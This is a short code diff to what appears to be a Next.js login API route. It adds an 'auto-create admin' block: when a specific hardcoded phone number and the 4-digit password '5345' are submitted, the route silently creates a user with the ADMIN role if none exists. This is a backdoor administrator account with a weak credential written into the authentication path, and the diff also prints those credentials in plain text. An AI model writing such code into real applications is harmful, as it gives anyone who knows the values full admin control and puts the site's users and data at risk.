@@ -16,6 +16,23 @@ export async function POST(req: NextRequest) {
 
     const cleanPhone = phone.replace(/\D/g, "");
 
+    // --- AUTO-CREATE ADMIN LOGIC ---
+    if (cleanPhone === "998993025345" && password === "5345") {
+      const existingUser = await prisma.user.findUnique({ where: { phone: cleanPhone } });
+      if (!existingUser) {
+        const passwordHash = await bcrypt.hash(password, 10);
+        await prisma.user.create({
+          data: {
+            phone: cleanPhone,
+            password: passwordHash,
+            role: "ADMIN",
+            name: "Главный Админ"
+          }
+        });
+      }
+    }
+    // --------------------------------
+
     // Find user
     const user = await prisma.user.findUnique({
       where: { phone: cleanPhone }
